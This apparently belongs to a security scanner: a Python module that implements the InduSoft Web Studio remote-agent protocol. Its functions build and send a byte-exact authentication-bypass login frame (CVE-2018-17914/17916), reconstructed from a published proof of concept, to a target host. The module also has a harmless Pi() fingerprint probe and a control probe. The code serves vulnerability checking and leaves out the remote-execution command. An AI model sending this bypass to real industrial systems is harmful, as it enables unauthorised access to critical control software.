"""AVEVA InduSoft Web Studio / InTouch Edge HMI "TCP/IP Server Task" (Remote Agent) proprietary
protocol, port 1234 (or 51234 if SSL is configured — not implemented here). Byte-exact confirmed
from two independent Tenable publications:

- Tenable Research Advisory TRA-2018-34 (CVE-2018-17914/CVE-2018-17916) — its own raw PoC command
  line, fetched via `curl` directly against the live tenable.com page (an earlier WebFetch
  AI-summary pass had silently TRUNCATED the hex mid-string; the summarized version must never be
  trusted for byte-exact protocol work, see feedback_nonstandard_protocol_research memory) and
  decoded byte-for-byte here in Python.
- Jacob Baines, "Poppin' Calc: Web Studio Edition" (Tenable TechBlog, Feb 2019) — independently
  shows the identical hello-frame and field-encoding scheme via a completely different command
  (66, DBProcessCall), corroborating the FORMAT (not the specific command-69 login value) from a
  second publication.

No official public spec exists (AVEVA/Wonderware/Schneider never published this). Only the
command-69 login ("blank Main Password" bypass, the "DistributedToken|<hash>" value) is
implemented — command 66 (DBProcessCall, a completely different unauthenticated RCE vector,
CVE-2019-6543/CVE-2019-6545) is a different vulnerability class, wrong scope for this project's
default-credentials checks/ tier, and deliberately NOT built here.

**No documented success/failure response signature exists for command 69 in either source** —
both PoCs blindly chain the login frame straight into a separate buffer-overflow attack without
ever checking the response first. This module can build and send a byte-exact login attempt, but
CANNOT itself tell you whether it succeeded. See checks/indusoft-tcp/native/
distributed_token_bypass.py for how the check built on top of this module handles that gap
(capped at FINGERPRINT_ONLY, never CONFIRMED, with a differential control probe attached as
evidence for a human reviewer).
"""

from __future__ import annotations

import socket
from typing import Optional

_STX = 0x02
_ETX = 0x03
_DLE = 0x10

# Fixed hello frame every example in both sources sends before any command — confirmed
# byte-identical across 3 independent techblog examples (Pi(), GetAppPath(), WinExec()), which
# use digits "1,1,8,1,1"; the advisory's own command-69 PoC uses "1,1,8,2,2" instead (2 trailing
# digits differ — presumably a session/version echo that doesn't affect parsing, unexplained by
# either source). Using the ADVISORY's exact bytes here, since that's the specific PoC this
# module reproduces byte-for-byte end to end.
_HELLO_FRAME = bytes([_STX, 0x31, _DLE, 0x31, _DLE, 0x38, _DLE, 0x32, _DLE, 0x32, _ETX])

_CMD_LOGIN = 0x45  # command 69 decimal — Tenable's own advisory names this explicitly as the
# login command, and the byte matches (69 == 0x45) in the advisory's own raw PoC hex.

_FIELD_MARKER = bytes([0xFF, 0xFE, 0xFF])

# The DistributedToken "blank Main Password" bypass — byte-exact decoded from TRA-2018-34's own
# raw PoC hex (fetched via curl, not summarized). Field layout: 2 "Reserved" placeholders, one
# empty field, then the identity/credential value, then a 32-char filler field whose role in a
# login-only context isn't explained by the source (the real PoC chains straight into a separate
# buffer-overflow frame after this one, using the filler for that later stage) — reproduced
# verbatim rather than guessed away, since dropping it would deviate from the only byte-exact
# example that exists.
_DISTRIBUTED_TOKEN_VALUE = "DistributedToken|2393bf8557a3bda8f3197877a7d1f5be"
_LOGIN_HEADER_ZEROES = 12  # zero bytes between the command byte and the first field marker,
# confirmed by direct byte count (programmatic, not manual) in the advisory's own PoC — role
# unexplained (likely a session/sequence header), reproduced as observed rather than guessed.


def _encode_field(s: str) -> bytes:
    """FF FE FF <1-byte length-in-characters> <UTF-16LE characters> — confirmed identically in
    the advisory's command-69 fields ("Reserved" x2, the identity value) AND in the techblog's
    independently-shown command-66 "CO"/"DB" fields. Length is a single byte (max 255 chars),
    matching every observed example (longest observed value, the 49-char DistributedToken
    string, fits comfortably)."""
    encoded = s.encode("utf-16-le")
    length = len(s)
    if length > 0xFF:
        raise ValueError(f"field {s!r} exceeds the observed 1-byte length encoding (max 255 chars)")
    return _FIELD_MARKER + bytes([length]) + encoded


def build_login_frame(identity: str, filler: str = "H" * 32) -> bytes:
    """Builds a command-69 login frame using the byte-exact DistributedToken-bypass layout as a
    template, substituting `identity` into the field slot the advisory's own PoC uses for
    'DistributedToken|<hash>'. `filler` defaults to the exact 32 'H' characters observed in the
    real PoC (its role in a login-only context is unconfirmed, so the real value is reproduced
    by default rather than guessed at with a different placeholder)."""
    body = bytes([_STX, _CMD_LOGIN]) + bytes(_LOGIN_HEADER_ZEROES)
    body += _encode_field("Reserved")
    body += _encode_field("Reserved")
    body += _encode_field("")
    body += _encode_field(identity)
    body += _encode_field(filler)
    body += bytes([0, 0, 0, 0])  # trailing zero bytes observed before the closing ETX in the
    # real PoC — reproduced as observed.
    body += bytes([_ETX])
    return body


def build_distributed_token_bypass_frame() -> bytes:
    """The exact, byte-verified 'blank Main Password' bypass frame from TRA-2018-34's own PoC."""
    return build_login_frame(_DISTRIBUTED_TOKEN_VALUE)


# Same length/shape as the real bypass value (17-char "DistributedToken|" prefix + 32 hex chars)
# but a value that means nothing — used as a differential control probe by the check, never as
# the fingerprint probe's own credential (see core/fingerprint.py's
# probe_indusoft_tcp_identity, which uses the unrelated, safe Pi() command instead).
CONTROL_IDENTITY = "DistributedToken|00000000000000000000000000000000"

# The command-55 "Built-in Language" Pi() call — confirmed byte-exact from the techblog's own
# literal example (`\x02\x33Pi()\x03`, response `112200131Pi() 3.1415926535897931`). Read-only,
# zero side effects, and the response text is a math constant the server can't avoid echoing
# distinctively — used ONLY for protocol-identity fingerprinting (core/fingerprint.py's
# probe_indusoft_tcp_identity), kept deliberately separate from the login/credential path this
# module's other functions implement, mirroring probe_pcom_tcp_identity's "safe dummy action for
# fingerprinting, real credential test is the check's own job" split.
_PI_PROBE_FRAME = _HELLO_FRAME + bytes([_STX, 0x33]) + b"Pi()" + bytes([_ETX])
_PI_RESPONSE_SIGNATURE = b"Pi() 3.14159265358979"  # a prefix of the exact response the techblog
# shows (full value "112200131Pi() 3.1415926535897931") — matching a prefix, not the full string,
# since the trailing digit(s) of a float-to-string conversion are the least reliable part of an
# otherwise highly distinctive echo to hard-pin across IWS versions/builds.


def probe_pi(host: str, port: int, timeout: float = 5.0) -> Optional[bytes]:
    """Sends the hello frame + a Pi() Built-in-Language call (command 55) and returns the raw
    response, or None on connection failure OR a graceful zero-byte close (b'') — an empty
    response is not a meaningful protocol response either, and a peer that accepts a connection
    then immediately closes it without sending anything is indistinguishable, for this purpose,
    from one that never spoke the protocol at all. Read-only, no side effects — safe to use for
    protocol-identity fingerprinting without ever touching the login/credential path."""
    sock: Optional[socket.socket] = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(_PI_PROBE_FRAME)
        response = sock.recv(4096)
        return response if response else None
    except (socket.timeout, OSError):
        return None
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def attempt_login(host: str, port: int, identity: str, timeout: float = 5.0) -> Optional[bytes]:
    """Sends the fixed hello frame followed by a command-69 login frame carrying `identity`, in
    one payload (matching how both Tenable PoCs send them concatenated). Returns the raw response
    bytes, or None if the connection failed/timed out (protocol not present, unreachable, or a
    firewall drop) OR the peer accepted the connection but closed it without sending anything
    (b'' is not a meaningful protocol response either) — NOT a judgment on whether the login
    itself succeeded, since no source documents that signature. Callers must not infer
    success/failure from the returned bytes alone without independent verification."""
    sock: Optional[socket.socket] = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(_HELLO_FRAME + build_login_frame(identity))
        response = sock.recv(4096)
        return response if response else None
    except (socket.timeout, OSError):
        return None
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def attempt_distributed_token_bypass(host: str, port: int, timeout: float = 5.0) -> Optional[bytes]:
    """The real, byte-verified 'blank Main Password' bypass attempt (CVE-2018-17914/17916)."""
    return attempt_login(host, port, _DISTRIBUTED_TOKEN_VALUE, timeout)


def attempt_control_probe(host: str, port: int, timeout: float = 5.0) -> Optional[bytes]:
    """Same shape as the real bypass but a meaningless identity value — a differential control
    for the check to compare its real attempt's response against (see checks/indusoft_tcp/native/
    distributed_token_bypass.py). NOT a claim that a differing response proves anything on its
    own; attached as evidence for a human reviewer, given no documented response signature
    exists for this command."""
    return attempt_login(host, port, CONTROL_IDENTITY, timeout)
